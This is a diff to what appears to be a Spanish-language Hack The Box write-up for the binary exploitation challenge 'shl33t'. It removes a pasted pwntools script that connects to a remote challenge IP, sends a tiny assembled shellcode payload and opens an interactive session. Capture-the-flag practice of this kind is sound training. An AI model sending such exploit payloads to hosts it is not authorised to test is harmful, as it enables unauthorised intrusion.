@@ -233,20 +233,4 @@ Un desafío limpio y didáctico para reforzar conceptos fundamentales de explota
 **unax**  
 Hack The Box – Binary Exploitation
 
-Tambien he encontrado este codigo en otro writeup nose si te servira de algo:
 
-from pwn import *
-
-elf = context.binary = ELF('./shl33t')
-#p = elf.process()
-p = remote('154.57.164.70',32458)
-
-pl = asm('''
-         shl ebx, 16
-         ret
-         ''')
-
-print(f'payload length: {len(pl)}')
-
-p.sendlineafter(b'$',pl)
-p.interactive()
